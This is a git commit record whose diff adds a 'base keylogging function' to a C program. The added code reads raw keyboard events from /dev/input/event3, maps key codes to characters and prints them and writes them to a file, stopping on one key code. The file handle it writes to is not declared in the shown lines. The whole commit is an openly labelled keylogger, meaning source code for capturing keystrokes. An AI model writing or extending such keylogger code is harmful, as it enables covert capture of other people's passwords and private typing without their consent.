22fa392415936cd3a2a7bcc9fa88c44ad74fd84a
systemb4 <lukasnitzsche@yahoo.com>
2021-08-06 09:17:16 -0500

    base keylogging funciton

--- main.c
+++ main.c
@@ -8,6 +8,24 @@
 #define EVENT_FILE "/dev/input/event3"
 
 int main(int argc, char **argv) {
+    struct input_event ev;
+    bool con = true;
+    int fd = open(EVENT_FILE, O_RDONLY);
+
+    char *map = "..1234567890-=..qwertyuiop[]\n.asdfghjkl;'~^\\zxcvbnm,./^.. .";
+
+    while(con) {
+        read(fd, &ev, sizeof(ev));
+        fflush(stdout);
+        if((ev.type == EV_KEY) && (ev.value == 0)) {
+            printf("%c", map[ev.code]);
+            fprintf(fp, "%c", map[ev.code]);
+        } else if(ev.code == 54) {
+            con = false;
+        }
+    }
+    fclose(fp);
+    close(fd);
 
     return 0;
 }
